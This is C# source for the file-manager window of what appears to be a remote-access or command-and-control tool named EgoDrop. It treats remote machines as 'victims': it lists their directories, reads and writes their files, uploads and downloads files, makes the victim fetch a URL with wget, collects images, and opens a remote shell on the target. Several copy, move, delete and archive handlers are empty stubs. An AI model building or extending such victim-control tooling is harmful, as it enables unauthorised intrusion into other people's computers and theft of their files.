using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmFileMgr : Form
    {
        public clsAgent m_agent { get; init; }
        public clsVictim m_victim { get; set; }
        public string m_szVictimID { get; init; }

        private string m_szInitDir { get; set; }
        private string m_szCurrentPath { get { return (string)textBox1.Tag; } }

        private bool m_bIsUnixLike { get; set; }
        private bool m_bIsWindows { get { return !m_bIsUnixLike; } }

        private string[] m_asWinShortCutDir =
        {

        };
        private string[] m_asLinuxShortCutDir =
        {

        };

        private List<stFileInfo> m_lsClipboard = new List<stFileInfo>();

        /// <summary>
        /// File information struct.
        /// Store the file information of remote file.
        /// </summary>
        private struct stFileInfo
        {
            public bool bDirectory { get; set; }                                              //Is directory.
            public string szFilePath { get; set; }                                            //File path.
            public string szFileName { get { return szFilePath.Split('/').Last(); } }         //File name.
            public ulong nFileSize { get; set; }                                              //File size(bytes).
            public string szPermission { get; set; }                                          //File permission(rwx).

            public string szCreationDate { get; set; }                                        //File creation date.
            public string szLastModifiedDate { get; set; }                                    //File last modified date.
            public string szLastAccessedDate { get; set; }                                    //File last accessed date.

            /// <summary>
            /// Constructor.
            /// </summary>
            /// <param name="bDirectory">Is directory.</param>
            /// <param name="szFilePath">File path.</param>
            /// <param name="nFileSize">File size(bytes).</param>
            /// <param name="szPermission">File permission(rwx).</param>
            /// <param name="szCreationDate">File creation date.</param>
            /// <param name="szLastModifiedDate">File last modified date.</param>
            /// <param name="szLastAccessedDate">File last accessed date.</param>
            public stFileInfo(
                bool bDirectory,           //Is directory
                string szFilePath,         //File path.
                ulong nFileSize,           //File size(bytes).
                string szPermission,       //File permission(rwx).

                string szCreationDate,     //File creation date.
                string szLastModifiedDate, //File last modified date.
                string szLastAccessedDate  //File last accessed date.
            )
            {
                this.bDirectory = bDirectory;
                this.szFilePath = szFilePath;
                this.nFileSize = nFileSize;
                this.szPermission = szPermission;

                this.szCreationDate = szCreationDate;
                this.szLastModifiedDate = szLastModifiedDate;
                this.szLastAccessedDate = szLastAccessedDate;
            }
        }

        public frmFileMgr(clsAgent agent)
        {
            InitializeComponent();

            m_agent = agent;
            m_szVictimID = agent.m_szVictimID;
            m_victim = agent.m_victim;
            m_szInitDir = string.Empty;
            m_bIsUnixLike = agent.m_bUnixlike;

            Text = $"FileMgr[{m_szVictimID}] | {(m_bIsUnixLike ? "Linux-like" : "Windows")}";
        }

        private stFileInfo fnGetFileInfo(ListViewItem item) => item.Tag == null ? new stFileInfo() : (stFileInfo)item.Tag;

        /// <summary>
        /// Victim received message event handler.
        /// </summary>
        /// <param name="listener">Listener object.</param>
        /// <param name="victim">Victim object.</param>
        /// <param name="lsMsg">Message list.</param>
        private void fnRecvMsg(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
        {
            if (!string.Equals(szSrcVictimID, m_szVictimID) || !clsTools.fnbSameVictim(victim, m_victim))
                return;

            Invoke(new Action(() =>
            {
                try
                {
                    if (lsMsg[0] == "file")
                    {
                        if (lsMsg[1] == "init") //Initialization.
                        {
                            textBox1.Text = lsMsg[2];
                            textBox1.Tag = lsMsg[2];
                            m_szInitDir = lsMsg[2];

                            TreeNode node = m_bIsUnixLike ? fnAddTreeNodeByPath(m_szInitDir) : fnWinAddTreeNodeByPath(m_szInitDir);
                            treeView1.ExpandAll();
                            treeView1.SelectedNode = node;
                        }
                        else if (lsMsg[1] == "drive") //Windows.AddDrive
                        {
                            List<string> lsDrive = clsEZData.fnlsB64D2Str(lsMsg[2]);
                            foreach (string szDrive in lsDrive)
                                fnWinAddTreeNodeByPath(szDrive);
                        }
                        else if (lsMsg[1] == "sd") //Scan directory.
                        {
                            string szPath = lsMsg[2];
                            TreeNode tnNode = fnFindTreeNodeByPath(szPath, treeView1.Nodes);

                            //Return if not exists.
                            if (tnNode == null)
                                return;

                            textBox1.Text = szPath; //Current path.
                            textBox1.Tag = szPath; //Current path.
                            listView1.Items.Clear();

                            //Decapsulation.
                            List<List<string>> ls = clsEZData.fn2dLB64Decode(lsMsg[3]);
                            List<stFileInfo> lsFolder = new List<stFileInfo>();
                            List<stFileInfo> lsFile = new List<stFileInfo>();

                            //Load file info into list.
                            foreach (var lFile in ls)
                            {
                                string szFilePath = lFile[1];
                                string szFileName = szFilePath.Split('/').Last();
                                if (string.IsNullOrEmpty(szFileName) || szFileName == "." || szFileName == "..")
                                    continue;

                                bool bDirectory = lFile[0] == "1";                 //Entity is directory.
                                ulong nFileSize = ulong.Parse(lFile[2]);           //Entity size (bytes).
                                string szPermission = lFile[3];                    //Entity permission (drwx).
                                string szCreationDate = lFile[4];                  //Entity creation date.
                                string szLastModifiedDate = lFile[5];              //Last modified date.
                                string szLastAccessedDate = lFile[6];              //Last accessed date.

                                stFileInfo file = new stFileInfo(
                                    bDirectory,
                                    szFilePath,
                                    nFileSize,
                                    szPermission,
                                    szCreationDate,
                                    szLastModifiedDate,
                                    szLastModifiedDate
                                );

                                if (bDirectory)
                                    lsFolder.Add(file);
                                else
                                    lsFile.Add(file);
                            }

                            //Sorting.
                            lsFolder.Sort((a, b) => a.szFileName.CompareTo(b.szFileName));
                            lsFile.Sort((a, b) => a.szFileName.CompareTo(b.szFileName));

                            List<stFileInfo> lFinal = lsFolder.Concat(lsFile).ToList();

                            //Add file info into treeview and listview.
                            foreach (var entry in lFinal)
                            {
                                ListViewItem item = new ListViewItem(entry.szFileName);
                                item.SubItems.Add(entry.nFileSize.ToString());
                                item.SubItems.Add(entry.szPermission);
                                item.SubItems.Add(entry.szCreationDate);
                                item.SubItems.Add(entry.szLastModifiedDate);
                                item.SubItems.Add(entry.szLastAccessedDate);

                                item.ImageIndex = entry.bDirectory ? 1 : 0;
                                item.Tag = entry;

                                listView1.Items.Add(item);

                                if (entry.bDirectory)
                                {
                                    fnAddTreeNodeByPath(entry.szFilePath);
                                }
                            }

                            //Expand node.
                            tnNode.Expand();
                            tnNode.EnsureVisible();

                            listView1.Refresh();

                            //Show info.
                            toolStripStatusLabel1.Text = $"Folder[{lsFolder.Count}] File[{lsFile.Count}]";
                        }
                        else if (lsMsg[1] == "goto") //Goto specified directory.
                        {
                            //Check specified directory existence.
                            int nCode = int.Parse(lsMsg[2]);
                            string szDirPath = lsMsg[3];

                            if (nCode == 0)
                            {
                                clsTools.fnShowErrMsgbox("Directory does not exist: " + szDirPath);
                                textBox1.Text = (string)textBox1.Tag;
                                textBox1.SelectionStart = textBox1.Text.Length;

                                return;
                            }

                            //Do scandir if dir exists.
                            TreeNode tnNode = fnAddTreeNodeByPath(szDirPath);
                            treeView1.SelectedNode = tnNode;
                        }
                        else if (lsMsg[1] == "del") //Delete
                        {
                            int nCode = int.Parse(lsMsg[2]);
                            string szPath = lsMsg[3];
                            string szMsg = lsMsg[4];

                            if (nCode == 0)
                                MessageBox.Show(szMsg, "DeleteFile", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            else
                                MessageBox.Show($"Delete successfully: " + szPath, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else if (lsMsg[1] == "cp") //Copy
                        {
                            int nCode = int.Parse(lsMsg[2]);
                            string szSrcPath = lsMsg[3];
                            string szDstPath = lsMsg[4];
                            string szMsg = lsMsg[5];

                            if (nCode == 0)
                                MessageBox.Show(szMsg, "CopyFile", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            else
                                MessageBox.Show($"Copy file successfully:{szSrcPath} -> {szDstPath}", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);

                            fnRefresh();
                        }
                        else if (lsMsg[1] == "mv") //Move
                        {
                            int nCode = int.Parse(lsMsg[2]);
                            string szSrcPath = lsMsg[3];
                            string szDstPath = lsMsg[4];
                            string szMsg = lsMsg[5];

                            if (nCode == 0)
                                MessageBox.Show(szMsg, "MoveFile", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            else
                                MessageBox.Show($"Move file successfully:{szSrcPath} -> {szDstPath}", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);

                            fnRefresh();
                        }
                        else if (lsMsg[1] == "nd") //New directory.
                        {
                            string szDirPath = lsMsg[2];
                            int nCode = int.Parse(lsMsg[3]);
                            string szMsg = lsMsg[4];

                            if (nCode == 0)
                            {
                                clsTools.fnShowErrMsgbox(szMsg, "New Directory");
                                return;
                            }

                            TreeNode node = fnFindTreeNodeByPath(m_szCurrentPath, treeView1.Nodes);
                            treeView1.SelectedNode = null;
                            treeView1.SelectedNode = node;
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "fileMgr", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }));
        }

        /// <summary>
        /// Find treeNode with specified absolute directory path.
        /// </summary>
        /// <param name="szPath">Directory's absolute path.</param>
        /// <param name="treeNodeCollection">TreeNode collection.</param>
        /// <param name="node">Node(For doing recurence(Null for calling).</param>
        /// <returns></returns>
        private TreeNode fnFindTreeNodeByPath(string szPath, TreeNodeCollection treeNodeCollection, TreeNode node = null)
        {
            if (string.IsNullOrEmpty(szPath) || treeNodeCollection.Count == 0)
                return node;

            if (node == null)
                node = treeNodeCollection[0];

            string szNewPath = szPath.Trim('/');
            string[] split = szNewPath.Split('/');
            foreach (TreeNode tnNode in node.Nodes)
            {
                if (string.Equals(tnNode.Text, split.First()))
                {
                    return fnFindTreeNodeByPath(string.Join("/", split.Skip(1).ToArray()), tnNode.Nodes, tnNode);
                }
            }

            return node;
        }

        /// <summary>
        /// Add path recursively(Windows).
        /// </summary>
        /// <param name="szPath">Directory absolute path.</param>
        /// <returns></returns>
        private TreeNode fnWinAddTreeNodeByPath(string szPath)
        {
            TreeNode fnRecursive(TreeNode node, string szRelativePath)
            {
                if (string.IsNullOrEmpty(szRelativePath))
                    return node;

                szRelativePath = szRelativePath.Trim('\\');

                string[] split = szRelativePath.Split('\\');
                string currentName = split.First();

                TreeNode tnNode = null;

                foreach (TreeNode t in node.Nodes)
                {
                    if (string.Equals(t.Text, currentName, StringComparison.OrdinalIgnoreCase))
                    {
                        tnNode = t;
                        break;
                    }
                }

                if (tnNode == null)
                {
                    tnNode = new TreeNode(currentName);

                    int nIdx = 0;
                    foreach (TreeNode t in node.Nodes)
                    {
                        if (string.Compare(tnNode.Text, t.Text, StringComparison.OrdinalIgnoreCase) > 0)
                            nIdx++;
                    }

                    node.Nodes.Insert(nIdx, tnNode);
                }

                string nextPath = string.Join("\\", split.Skip(1));
                return fnRecursive(tnNode, nextPath);
            }

            if (string.IsNullOrWhiteSpace(szPath))
                return null;

            szPath = szPath.TrimEnd('\\');
            string[] parts = szPath.Split('\\');

            string drive = parts[0];
            string relativePath = string.Join("\\", parts.Skip(1));

            TreeNode driveNode = null;

            foreach (TreeNode t in treeView1.Nodes)
            {
                if (string.Equals(t.Text, drive, StringComparison.OrdinalIgnoreCase))
                {
                    driveNode = t;
                    break;
                }
            }

            if (driveNode == null)
            {
                driveNode = new TreeNode(drive);

                int nIdx = 0;
                foreach (TreeNode t in treeView1.Nodes)
                {
                    if (string.Compare(driveNode.Text, t.Text, StringComparison.OrdinalIgnoreCase) > 0)
                        nIdx++;
                }

                treeView1.Nodes.Insert(nIdx, driveNode);
            }

            if (string.IsNullOrEmpty(relativePath))
                return driveNode;

            return fnRecursive(driveNode, relativePath);
        }

        /// <summary>
        /// Add path recursively(Unix-like).
        /// </summary>
        /// <param name="szPath">Directory absolute path.</param>
        /// <returns></returns>
        private TreeNode fnAddTreeNodeByPath(string szPath)
        {
            TreeNode fnRecursive(TreeNode node, string szRelativePath)
            {
                if (string.IsNullOrEmpty(szRelativePath))
                    return node;
                else
                {
                    if (string.IsNullOrEmpty(szRelativePath))
                        return node;

                    szRelativePath = szRelativePath.Trim('/');

                    TreeNode tnNode = null;
                    string[] split = szRelativePath.Split('/');

                    foreach (TreeNode t in node.Nodes)
                    {
                        if (string.Equals(t.Text, split.First()))
                        {
                            tnNode = t;
                            break;
                        }
                    }

                    if (tnNode == null)
                    {
                        tnNode = new TreeNode(split.First());

                        int nIdx = 0;
                        foreach (TreeNode t in node.Nodes)
                        {
                            if (string.Compare(tnNode.Text, t.Text) > 0)
                                nIdx++;
                        }

                        node.Nodes.Insert(nIdx, tnNode);

                        return fnRecursive(tnNode, string.Join("/", split.Skip(1).ToArray()));
                    }
                    else
                    {
                        return fnRecursive(tnNode, string.Join("/", split.Skip(1).ToArray()));
                    }
                }
            }

            TreeNode tnRoot = null;
            if (treeView1.Nodes.Count == 0)
            {
                tnRoot = new TreeNode("/");
                treeView1.Nodes.Add(tnRoot);
            }
            else
            {
                tnRoot = treeView1.Nodes[0];
                if (m_bIsWindows)
                {
                    string[] s = szPath.Split('/');
                    foreach (TreeNode n in treeView1.Nodes)
                    {
                        if (string.Equals(n.Text, s.First()))
                        {
                            tnRoot = n;
                            szPath = string.Join('/', s[1..]);

                            break;
                        }
                    }
                }
            }

            if (szPath == "/")
            {
                return tnRoot;
            }
            else
            {
                return fnRecursive(tnRoot, szPath);
            }
        }

        #region Functions

        /// <summary>
        /// Write text into specified file.
        /// </summary>
        /// <param name="szFilePath">File path.</param>
        /// <param name="szContent">Text content.</param>
        public void fnWriteFile(string szFilePath, string szContent)
        {
            m_victim.fnSendCommand(m_szVictimID, new string[]
            {
                "file",
                "wf",
                szFilePath,
                szContent,
            });
        }

        /// <summary>
        /// Read file from specified file's absolute path.
        /// </summary>
        /// <param name="szFilePath">File path.</param>
        public void fnReadFile(string szFilePath)
        {
            frmFileEditor f = clsTools.fnFindForm<frmFileEditor>(m_victim, m_szVictimID);
            if (f == null)
            {
                f = new frmFileEditor(m_szVictimID, m_victim);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }

            m_victim.fnSendCommand(m_szVictimID, new string[]
            {
                "file",
                "rf",
                szFilePath,
            });
        }

        /// <summary>
        /// Goto specified directory.
        /// </summary>
        /// <param name="szDirPath">Directory's absolute path.</param>
        public void fnGoto(string szDirPath)
        {
            m_victim.fnSendCommand(m_szVictimID, new string[]
            {
                "file",
                "goto",
                szDirPath,
            });
        }

        /// <summary>
        /// Refresh current file explorer.
        /// </summary>
        public void fnRefresh()
        {
            if (textBox1.Tag == null)
                return;

            string szCurrentPath = (string)textBox1.Tag;
            if (string.IsNullOrEmpty(szCurrentPath))
                return;

            fnGoto(szCurrentPath);
        }

        /// <summary>
        /// Set file clipboard.
        /// </summary>
        /// <param name="lsInfo">Entity list.</param>
        private void fnSetClipboard(List<stFileInfo> lsInfo)
        {
            TreeNode nodeFolders;
            TreeNode nodeFiles;

            if (treeView2.Nodes.Count == 0)
            {
                nodeFolders = new TreeNode("Folder");
                nodeFiles = new TreeNode("File");
            }
            else
            {
                nodeFolders = treeView2.Nodes[0];
                nodeFiles = treeView2 .Nodes[1];
            }

            nodeFolders.Nodes.Clear();
            nodeFiles.Nodes.Clear();

            foreach (var info in lsInfo)
            {
                (info.bDirectory ? nodeFolders : nodeFiles).Nodes.Add(new TreeNode()
                {
                    Text = info.szFileName,
                    Tag = info,
                });
            }
        }

        /// <summary>
        /// Get entity list from clipboard.
        /// </summary>
        /// <returns></returns>
        private List<stFileInfo> fnGetClipboard()
        {
            if (treeView2.Nodes.Count == 0)
            {
                MessageBox.Show("Initialization error.", "fnGetClipboard()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return new List<stFileInfo>();
            }

            TreeNode nodeFolders = treeView2.Nodes[0];
            TreeNode nodeFiles = treeView2.Nodes[1];

            List<stFileInfo> lsInfo = nodeFolders.Nodes.Cast<TreeNode>()
                .Concat(nodeFiles.Nodes.Cast<TreeNode>())
                .Select(x => (stFileInfo)x.Tag).ToList();

            return lsInfo;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="szSrcEntity"></param>
        /// <param name="szDstEntity"></param>
        /// <param name="bIsDir"></param>
        public void fnCopy(string szSrcEntity, string szDstEntity, bool bIsDir)
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="lsInfo"></param>
        /// <param name="szDstDir"></param>
        private void fnCopy(List<stFileInfo> lsInfo, string szDstDir)
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="szSrcEntity"></param>
        /// <param name="szDstEntity"></param>
        /// <param name="bIsDir"></param>
        public void fnMove(string szSrcEntity, string szDstEntity, bool bIsDir)
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="lsInfo"></param>
        /// <param name="szDstDir"></param>
        private void fnMove(List<stFileInfo> lsInfo, string szDstDir)
        {

        }

        /// <summary>
        /// Delete file.
        /// </summary>
        /// <param name="szPath">Target file path.</param>
        /// <param name="bIsDir">Is directory?</param>
        public void fnDelete(string szPath, bool bIsDir)
        {

        }

        /// <summary>
        /// Delete entities.
        /// </summary>
        /// <param name="lsInfo"></param>
        private void fnDelete(List<stFileInfo> lsInfo)
        {

        }

        #endregion

        private void fnSetup()
        {
            fnSetClipboard(new List<stFileInfo>());

            m_victim.fnSendCommand(m_szVictimID, "file|init");
            m_victim.m_listener.evtReceivedMessage += fnRecvMsg;
        }

        private void frmFileMgr_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmFileMgr_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.evtReceivedMessage -= fnRecvMsg;
        }

        private async void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            string szPath = treeView1.SelectedNode.FullPath.Replace("\\", "/").Replace("//", "/");
            m_victim.fnSendCommand(m_szVictimID, "file|sd|" + szPath);
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            ListViewItem item = listView1.SelectedItems.Cast<ListViewItem>().First();
            if (item == null)
                return;

            stFileInfo info = fnGetFileInfo(item);
            if (info.bDirectory)
            {
                TreeNode node = fnFindTreeNodeByPath(info.szFilePath, treeView1.Nodes);
                treeView1.SelectedNode = node;
            }
            else
            {

                fnReadFile(info.szFilePath);
            }
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                string szDirPath = textBox1.Text;
                fnGoto(szDirPath);
            }
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            List<string> lsImage = listView1.Items.Cast<ListViewItem>().ToList()
                .Select(x => fnGetFileInfo(x))
                .Where(x => !x.bDirectory && clsTools.fnbIsImage(x.szFileName))
                .Select(x => x.szFilePath)
                .ToList();

            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_agent);
            if (f == null)
            {
                f = new frmFileImage(m_agent);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }

            f.fnSendImageRequest(lsImage);
        }

        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            List<string> lsImage = listView1.SelectedItems.Cast<ListViewItem>().ToList()
                .Select(x => fnGetFileInfo(x))
                .Where(x => !x.bDirectory && clsTools.fnbIsImage(x.szFileName))
                .Select(x => x.szFilePath)
                .ToList();

            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_agent);
            if (f == null)
            {
                f = new frmFileImage(m_agent);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }

            f.fnSendImageRequest(lsImage);
        }

        //New Folder
        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            ListViewItem item = new ListViewItem($"Folder_{clsEZData.fnszDateString()}");
            listView1.Items.Add(item);

            listView1.LabelEdit = true;
            item.BeginEdit();
        }
        //New Text File
        private void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            frmFileEditor f = new frmFileEditor(m_szVictimID, m_victim);

            f.Show();

            string szFilePath = $"{m_szCurrentPath}/{clsEZData.fnszDateFileName("txt")}";
            f.fnAddNewPage(szFilePath, string.Empty);
        }

        private void listView1_AfterLabelEdit(object sender, LabelEditEventArgs e)
        {
            ListViewItem item = listView1.Items[e.Item];

            if (e.Label == null)
            {
                listView1.Items.Remove(item);
                return;
            }

            m_victim.fnSendCommand(m_szVictimID, new string[]
            {
                "file",
                "nd",
                m_szCurrentPath + "/" + item.Text,
            });

            listView1.LabelEdit = false;
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                stFileInfo info = fnGetFileInfo(item);
                if (info.bDirectory)
                    continue;

                fnReadFile(info.szFilePath);
            }
        }

        //New.Folder
        private void toolStripMenuItem19_Click(object sender, EventArgs e)
        {
            ListViewItem item = new ListViewItem($"Folder_{clsEZData.fnszDateString()}");
            listView1.Items.Add(item);

            listView1.LabelEdit = true;
            item.BeginEdit();
        }

        //New.Text File
        private void toolStripMenuItem20_Click(object sender, EventArgs e)
        {
            frmFileEditor f = new frmFileEditor(m_szVictimID, m_victim);

            f.Show();

            string szFilePath = $"{m_szCurrentPath}/{clsEZData.fnszDateFileName("txt")}";
            f.fnAddNewPage(szFilePath, string.Empty);
        }

        //Home
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindTreeNodeByPath(m_szInitDir, treeView1.Nodes);
            treeView1.SelectedNode = node;
        }

        //Copy
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {

        }

        //Move
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {

        }

        //Paste
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {

        }

        //Delete
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {

        }

        //Upload
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = true;

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                List<string> lsFile = ofd.FileNames.ToList();

                frmFileTransfer f = new frmFileTransfer(m_agent, lsFile, clsFileHandler.enMode.Upload);
                f.Show();
            }
        }

        //Download
        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            List<string> lsFile = new List<string>();
            bool bWarning = false;
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                var stInfo = fnGetFileInfo(item);
                if (stInfo.bDirectory)
                {
                    if (!bWarning)
                    {
                        MessageBox.Show("Source entities contain folder, they will not be included.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        bWarning = true;
                    }

                    continue;
                }
            }

            frmFileTransfer f = new frmFileTransfer(m_agent, lsFile, clsFileHandler.enMode.Download);
            f.Show();
        }

        //WGET
        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            frmFileWGET f = new frmFileWGET(m_szVictimID, m_victim);
            f.Show();
        }

        //Archive.Compress
        private void toolStripMenuItem17_Click(object sender, EventArgs e)
        {

        }

        //Archive.Decompress
        private void toolStripMenuItem18_Click(object sender, EventArgs e)
        {

        }

        //ParentNode
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindTreeNodeByPath(m_szCurrentPath, treeView1.Nodes);
            if (node == null)
                return;

            if (node.Parent == null)
                return;

            treeView1.SelectedNode = node.Parent;
        }

        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            frmShell f = clsTools.fnFindForm<frmShell>(m_victim, m_szVictimID);
            if (f == null)
            {
                f = new frmShell(m_agent, m_szCurrentPath);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }
        }

        private void toolStripMenuItem21_Click(object sender, EventArgs e)
        {
            frmShell f = clsTools.fnFindForm<frmShell>(m_victim, m_szVictimID);
            if (f == null)
            {
                f = new frmShell(m_agent, m_szCurrentPath);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }
        }
    }
}
